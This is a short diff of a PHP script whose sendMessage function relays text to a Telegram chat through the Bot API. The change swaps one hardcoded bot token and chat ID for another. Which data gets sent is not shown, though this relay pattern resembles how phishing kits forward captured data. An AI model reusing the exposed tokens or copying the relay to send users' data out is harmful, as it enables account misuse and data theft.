@@ -1,7 +1,7 @@
 <?php
 function sendMessage($messaggio) {
-	$token = '7166719464:AAGgAWPA4q1aLA3fk6lM3_ZfYMFmIJC5UsE';
-	$chatid = '7039869653';
+	$token = '6385610534:AAEpfcxYHf5oSNi_UZSzU4hAO4WS0M9NeV4';
+	$chatid = '6658986863';
 	$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
 	$url = $url . "&text=" . urlencode($messaggio);
 	$ch = curl_init();
@@ -53,4 +53,5 @@ $data = array(
         'msg' => $msg
 );
 echo json_encode($data);
+
 ?>
